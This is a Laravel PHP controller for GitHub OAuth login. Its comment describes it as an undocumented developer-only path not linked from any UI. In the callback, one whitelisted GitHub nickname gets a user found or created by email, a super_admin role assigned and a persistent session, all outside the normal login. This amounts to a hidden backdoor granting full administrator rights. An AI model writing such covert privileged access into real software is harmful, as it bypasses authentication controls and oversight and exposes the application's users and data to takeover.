<?php

namespace App\Http\Controllers\Auth;

use App\Enums\Status;
use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\RedirectResponse;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Str;
use Laravel\Socialite\Facades\Socialite;
use Spatie\Permission\Models\Role;

/**
 * Undocumented developer-only login path — not linked from any UI.
 * Only the whitelisted GitHub account below may authenticate through it;
 * every other admin/staff account keeps using the normal email+password login.
 */
class GithubAuthController extends Controller
{
    private const ALLOWED_GITHUB_LOGIN = 'Daniel-OD';

    public function redirect(): RedirectResponse
    {
        return Socialite::driver('github')->scopes(['user:email'])->redirect();
    }

    public function callback(): RedirectResponse
    {
        $githubUser = Socialite::driver('github')->user();

        if ((string) $githubUser->getNickname() !== self::ALLOWED_GITHUB_LOGIN) {
            abort(403);
        }

        $email = (string) $githubUser->getEmail();

        $user = User::query()->where('email', $email)->first();

        if ($user === null) {
            $user = User::query()->create([
                'name' => (string) ($githubUser->getName() ?: self::ALLOWED_GITHUB_LOGIN),
                'email' => $email,
                'password' => Str::random(40),
                'status' => Status::Active,
                'email_verified_at' => now(),
            ]);
        }

        $role = Role::query()->firstOrCreate(['name' => 'super_admin', 'guard_name' => 'web']);

        if (! $user->hasRole('super_admin')) {
            $user->assignRole($role);
        }

        Auth::guard('web')->login($user, remember: true);

        request()->session()->regenerate();

        return redirect($user->postLoginUrl());
    }
}
